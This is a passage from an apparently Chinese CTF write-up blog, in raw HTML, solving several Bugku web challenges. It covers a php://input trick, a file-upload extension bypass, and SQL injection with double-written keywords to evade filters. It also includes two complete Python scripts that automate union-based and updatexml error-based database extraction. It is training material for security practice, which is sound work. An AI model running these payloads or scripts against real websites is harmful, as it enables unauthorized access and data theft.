variable">$f</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 输出flag</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>This is flag:"</span> <span class="token punctuation">.</span><span class="token string">" $flag&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 否则输出sorry!</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token string">"&lt;p>sorry!&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里注意四点：</p><ol><li>ac的值不能为空。</li><li>f的值是从fn中获取的。</li><li>ac要全等于f</li><li>题目提示.txt</li></ol><p><strong>方法一：</strong><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115003629434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>根据提示访问flag.txt，得到字符串flags：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115002830323.png#pic_center" alt="在这里插入图片描述"></p><p>既然 f 的值是从fn中读取的，且ac全等于fn就输出flag，那么exp就出来了：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web8/?ac=flags&amp;fn=flag.txt</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>方法二：</strong></p><h5 id="PHP伪协议-2"><a href="#PHP伪协议-2" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h5><p>其实这道题的突破点就在 $fn 上，我们可以用php://input进行一个数据流传输，来定义fn的值，然后ac与定义的值一样就行了：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115003429967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag: flag{3cfb7a90fc0de31}</strong></p><h3 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h3><h5 id="目录扫描-2"><a href="#目录扫描-2" class="headerlink" title="目录扫描"></a>目录扫描</h5><p>上来啥也没有，直接去扫一下目录吧<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115005638713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>robots.txt里给出了真正的页面：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115005719973.png#pic_center" alt="在这里插入图片描述"></p><p>访问一下，得到了一段源码：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115005843325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>题目是想办法成为管理员，这里x用一些弱口令来试一下就行了：</p><pre class="line-numbers language-php"><code class="language-php">exp：http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:8002/web13/resusl.php?x=admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115010045694.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag(ctf_0098_lkji-s)</strong></p><h3 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h3><h5 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115010253944.png#pic_center" alt="在这里插入图片描述"></p><p>抓包后修改一下Content-Type与后缀名，这里后缀名经过多次测试，只有php5可以执行，其余的也可以上传，但是拿不到flag，这里看似是一个黑名单，实则它就是做了一个白名单限制，只有php5这个后缀的文件才能出flag。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115012027850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：KEY{bb35dc123820e}</strong></p><h3 id="这是一个神奇的登陆框"><a href="#这是一个神奇的登陆框" class="headerlink" title="这是一个神奇的登陆框"></a>这是一个神奇的登陆框</h3><h5 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h5><p>报错</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:9004/1ndex.php?id=1%27</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111516540318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>加注释后返回正常</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:9004/1ndex.php?id=1%27%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115165433191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以判断出这是有注入的，接下来检查以下字段长度，他这里过滤了or，我们双写绕过：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:9004/1ndex.php?id=1%27oorrder%20by%203%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里用异或判断一下它过滤了那些关键字：</p><pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//123.206.87.240:9004/1ndex.php?id=1'^(length('union')!=0)%23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果页面返回正常说明union被过滤了，它过滤了<strong>or、union、select、and</strong>，这些我们都双写就行了.</p><h5 id="Python编写exp-4"><a href="#Python编写exp-4" class="headerlink" title="Python编写exp"></a>Python编写exp</h5><p>为了方便注入，我自己写了一个注入脚本，但当我跑出flag的时候才发现，事情并没有那么简单，先看一下脚本吧，这就是一个简单的数字型注入，注意双写它过滤的关键字就行了：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/11/15 18:47</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : Bugku_多次.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token comment" spellcheck="true"># 爆数据库</span><span class="token keyword">def</span> <span class="token function">get_database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"ununionion seselectlect 1,database()#"</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    database <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"&lt;center>&lt;font  color= '#fff'>(.*?)&lt;br>&lt;/font>&lt;/center>"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前数据库为：'</span><span class="token punctuation">,</span>database<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆表名</span><span class="token keyword">def</span> <span class="token function">get_tables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()#"</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    tables <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"&lt;center>&lt;font  color= '#fff'>(.*?)&lt;br>&lt;/font>&lt;/center>"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前数据表为：'</span><span class="token punctuation">,</span>tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    table_name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入要爆的数据表名：'</span><span class="token punctuation">)</span>    get_columns<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆列名</span><span class="token keyword">def</span> <span class="token function">get_columns</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"ununionion seselectlect 1, group_concat(column_name) from infoorrmation_schema.columns where table_name='{}'#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    columns <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"&lt;center>&lt;font  color= '#fff'>(.*?)&lt;br>&lt;/font>&lt;/center>"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据表{}的所有字段名为：'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">,</span>columns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    column_name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入要爆的字段名名：'</span><span class="token punctuation">)</span>    get_data<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span>table<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆字段</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"ununionion seselectlect 1, group_concat({}) from {}#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>column<span class="token punctuation">,</span>table<span class="token punctuation">)</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    data <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"&lt;center>&lt;font  color= '#fff'>(.*?)&lt;br>"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'字段{}的内容为：'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>column<span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:9004/1ndex.php?id=-1%27%20"</span>    local <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 开始</span>    get_database<span class="token punctuation">(</span><span class="token punctuation">)</span>    get_tables<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>跑出flag1的内容：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115212704262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>提交失败，于是我就去跑address，结果出来了个下一关…<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115212800929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="Xpath报错注入"><a href="#Xpath报错注入" class="headerlink" title="Xpath报错注入"></a>Xpath报错注入</h5><p>这里利用 <strong>updatexml()</strong> 函数报错注入</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115213010331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><blockquote><p>先来看一下updatexml()函数<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：<strong>XML_document</strong>是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：<strong>XPath_string</strong> (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：<strong>new_value</strong>，String格式，替换查找到的符合条件的数据<br>作用：<strong>改变文档中符合条件的节点的值</strong><br>改变XML_document中符合XPATH_string的值<br>而我们的注入语句为：<br><code>updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</code><br>其中的 concat() 函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出<br><code>ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'</code></p></blockquote><h5 id="继续Python编写exp"><a href="#继续Python编写exp" class="headerlink" title="继续Python编写exp"></a>继续Python编写exp</h5><p>更新一下脚本就行了：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time    : 2020/11/15 21:32</span><span class="token comment" spellcheck="true"># @Author  : Shadow</span><span class="token comment" spellcheck="true"># @Site    : </span><span class="token comment" spellcheck="true"># @File    : Bugku_真·多次.py</span><span class="token comment" spellcheck="true"># @Software: PyCharm</span><span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token comment" spellcheck="true"># 爆表名</span><span class="token keyword">def</span> <span class="token function">get_tables</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),3) #"</span>    <span class="token comment" spellcheck="true"># print(url+parse.quote(exp))</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    tables <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"XPATH syntax error: '~(.*?)~'"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'当前数据表为：'</span><span class="token punctuation">,</span>tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    table_name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入要爆的数据表名：'</span><span class="token punctuation">)</span>    get_columns<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆列名</span><span class="token keyword">def</span> <span class="token function">get_columns</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),'~'),3) #"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    columns <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"XPATH syntax error: '~(.*?)~'"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'数据表{}的所有字段名为：'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">,</span>columns<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    column_name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入要爆的字段名名：'</span><span class="token punctuation">)</span>    get_data<span class="token punctuation">(</span>column_name<span class="token punctuation">,</span>table<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爆字段</span><span class="token keyword">def</span> <span class="token function">get_data</span><span class="token punctuation">(</span>column<span class="token punctuation">,</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>    exp <span class="token operator">=</span> <span class="token string">"and updatexml(1,concat('~',(select {} from {}),'~'),3) #"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>column<span class="token punctuation">,</span>table<span class="token punctuation">)</span>    html <span class="token operator">=</span> local<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token operator">+</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    data <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">"XPATH syntax error: '~(.*?)~'"</span><span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'字段{}的内容为：'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>column<span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">"http://123.206.87.240:9004/Once_More.php?id=1%27%20"</span>    local <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 开始</span>    get_tables<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到真·flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115215739563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p><strong>flag：flag{Bugku-sql_6s-2i-4t-bug}</strong></p><h3 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h3><p>题目提示经过了base64编码，我们解下码先：</p><p>啥也不是</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201115220022472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="代码审计-7"><a href="#代码审计-7" class="headerlink" title="代码审计"></a>代码审计</h5><p>把文件下载下来，是一道代码审计题，先来分析下源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token shell-comment comment"># md5加密字符串ISCC</span>    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'ISCC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 定义变量x</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 获取data的长度</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 获取key的长度</span>    <span class="token variable">$klen</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 循环，次数小于len的值</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 当x与klen都为0时</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$klen</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>               <span class="token shell-comment comment"># x=0</span>            <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token shell-comment comment"># char=key的第一个值</span>        <span class="token variable">$char</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token shell-comment comment"># 自加</span>        <span class="token variable">$x</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token shell-comment comment"># 循环，次数小于len的值</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment"># 取data里面的第i个数据加上char里面的第i个数据 把他们的ord()ASCII值相加取余128</span>        <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$char</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="同余加密解密"><a href="#同余加密解密" class="headerlink" title="同余加密解密"></a>同余加密解密</h5><p>这里最关键的点就是同于加密解密，<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190326093743458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">再来详细一些：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20190326094044658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 